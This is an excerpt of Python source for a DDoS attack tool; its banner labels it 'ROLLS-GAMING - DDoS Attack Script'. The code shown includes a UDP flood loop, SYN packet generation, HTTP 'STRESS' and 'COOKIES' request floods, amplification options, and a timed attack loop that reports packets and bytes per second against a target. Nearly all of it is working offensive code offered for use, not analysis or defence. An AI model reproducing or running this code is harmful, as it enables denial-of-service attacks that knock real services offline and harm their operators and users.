...
class Layer4(Thread):
    ...
    def UDP(self) -> None:
        ...
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(), self._target):
                continue
        Tools.safe_close(s)
    ...
    def _genrate_syn(self) -> bytes:
        ...
        tcp.set_th_sport(ProxyTools.Random.rand_int(23100,32100))
        ip.contains(tcp)
...
class HttpFlood(Thread):
    ...
    def STRESS(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 524\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % ProxyTools.Random.rand_str(23100,32100))[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
    ...
    def COOKIES(self) -> None:
        payload: bytes = self.generate_payload(
            ...
            " %s=%s\r\n" %
            (ProxyTools.Random.rand_int(23100,32100), ProxyTools.Random.rand_str(6),
        ...
        with suppress(Exception), self.open_connection() as s:
            ...
            while Tools.send(s, payload) and s.recv(1):
                for i in range(self._rpc):
                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(23100,32100))
                    Tools.send(s, keep)
                    sleep(self._rpc / 15)
                    break
        Tools.safe_close(s)
...
class ToolsConsole:
    ...
    def usage():
        print((
                  '* ROLLS-GAMING - DDoS Attack Script With %d Methods\n'
          ...
          with suppress(IndexError):
              ...
              if method in Methods.LAYER7_METHODS:
                  ...
                  if method == "BOMB":
                      assert (
                          ...
                          "Install bombardier: "
                          "https://github.com/Attack_Terminator/ROLLS-GAMING/wiki/BOMB-method"
                      )
              ...
              if method in Methods.LAYER4_METHODS:
                  ...
                  if method in Methods.LAYER4_AMP:
                      ...
                      logger.warning("https://github.com/ROLLS-GAMING/Attack_Terminator/wiki/Amplification-ddos-attack")
              ...
              logger.info(f"{bcolors.FAIL}Send Packet To{bcolors.WARNING} %s{bcolors.FAIL} Dengan{bcolors.WARNING} %s{bcolors.FAIL} Methods Tools{bcolors.WARNING} %s{bcolors.FAIL} And Seconds, And Threads:{bcolors.WARNING} %d{bcolors.FAIL}!!!{bcolors.RESET}"
                     % (target or url.host, method, timer, threads))
              event.set()
              ts = time()
              while time() < ts + timer:
                  logger.debug(f'{bcolors.OKBLUE}Target Host:{bcolors.OKGREEN} %s,{bcolors.OKBLUE} Target Port:{bcolors.OKGREEN} %s,{bcolors.OKBLUE} Methods Tools:{bcolors.OKGREEN} %s{bcolors.OKBLUE} PPS:{bcolors.OKGREEN} %s,{bcolors.OKBLUE} BPS:{bcolors.OKGREEN} %s / %d%%{bcolors.RESET}' %
                               (target or url.host,
